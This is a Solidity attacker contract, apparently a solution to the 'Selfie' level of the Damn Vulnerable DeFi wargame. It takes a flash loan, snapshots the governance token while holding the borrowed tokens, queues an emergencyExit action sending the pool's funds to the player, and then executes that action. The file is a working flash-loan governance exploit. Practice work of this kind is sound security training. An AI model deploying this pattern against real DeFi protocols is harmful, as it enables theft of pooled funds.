// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {console} from "hardhat/console.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {console} from "hardhat/console.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    ISimpleGovernance private immutable goverance;
    SelfiePool private immutable pool;
    address private dvt;
    address private player;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 private actionId;

    constructor(
        address _dvt,
        address _pool,
        address _goverance,
        address _player
    ) {
        dvt = _dvt;
        pool = SelfiePool(_pool);
        goverance = ISimpleGovernance(_goverance);
        player = _player;
    }

    function attack() external returns (uint256) {
        pool.flashLoan(this, dvt, pool.maxFlashLoan(dvt), "0x");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        console.log("onFlashLoan");
        DamnValuableTokenSnapshot(goverance.getGovernanceToken()).snapshot();
        actionId = goverance.queueAction(
            address(pool),
            0,
            abi.encodeWithSelector(SelfiePool.emergencyExit.selector, player)
        );
        DamnValuableToken(token).approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        goverance.executeAction(actionId);
    }
}
